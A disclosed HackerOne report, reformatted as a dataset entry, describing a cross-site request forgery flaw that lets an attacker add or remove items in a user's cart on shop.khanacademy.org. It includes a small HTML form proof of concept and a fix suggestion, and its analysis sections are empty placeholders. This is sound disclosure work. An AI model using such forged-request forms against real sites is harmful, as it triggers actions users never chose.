---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '6378'
original_report_id: '6378'
title: CSRF - Adding/Removing items to cart - shop.khanacademy.org
weakness: Cross-Site Request Forgery (CSRF)
team_handle: khanacademy
created_at: '2014-04-08T01:39:37.009Z'
disclosed_at: '2014-05-08T03:22:47.863Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 2
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF - Adding/Removing items to cart - shop.khanacademy.org

## Metadata

- HackerOne Report ID: 6378
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: khanacademy
- Disclosed At: 2014-05-08T03:22:47.863Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Hi there,

I've discovered a possiblity to remove/add items to a users' cart at shop.khanacademy.org.

###Details

```
- Host: shop.khanacademy.org
- URL: http://shop.khanacademy.org/cart
- Affected parameters: updates[PRODUCTID]
```


###Steps to reproduce
- 1. Visit http://shop.khanacademy.org/cart and empty your cart
- 2. Run the following CSRF PoC:

```
<html>
  <body>
    <form action="http://shop.khanacademy.org/cart" method="POST">
      <input type="hidden" name="updates&#91;211669705&#93;" value="1" />
      <input type="hidden" name="update" value="Update&#32;quantities" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

- 3. Take a look into your cart again
- 4. There should be a new item. 

An attacker can set the quantity to zero to remove an item or increase / add new items to the cart. 

###How to fix?
You should add a CSRF token to the form. 

Best regards,
Sebastian Neef

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
